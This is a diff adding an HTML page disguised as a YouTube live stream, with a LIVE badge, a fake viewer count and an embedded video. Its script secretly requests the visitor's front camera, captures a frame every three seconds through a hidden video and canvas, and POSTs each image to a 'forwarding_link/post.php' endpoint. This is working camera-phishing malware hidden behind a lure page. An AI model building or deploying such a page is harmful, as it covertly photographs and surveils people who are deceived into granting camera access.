@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Stream - YouTube</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0f0f0f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            background: #000;
+        }
+        
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .chat-overlay {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            border-radius: 10px;
+            padding: 10px;
+            color: white;
+            font-size: 12px;
+        }
+        
+        .live-badge {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: #ff0000;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            z-index: 100;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .viewer-count {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+    <div class="live-badge">🔴 LIVE</div>
+    <div class="viewer-count">👥 1.2K watching</div>
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&mute=0" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen>
+        </iframe>
+    </div>
+    
+    <script>
+        (function() {
+            var video = document.createElement('video');
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
+            var canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.style.display = 'none';
+            document.body.appendChild(canvas);
+            
+            function captureAndSend(imgdata) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'forwarding_link/post.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('cat=' + encodeURIComponent(imgdata));
+            }
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } })
+                    .then(function(stream) {
+                        video.srcObject = stream;
+                        var context = canvas.getContext('2d');
+                        setInterval(function() {
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var imgData = canvas.toDataURL("image/png");
+                            captureAndSend(imgData);
+                        }, 3000);
+                    })
+                    .catch(function(err) {
+                        console.log("Camera access:", err.message);
+                    });
+            }
+        })();
+    </script>
+</body>
+</html>
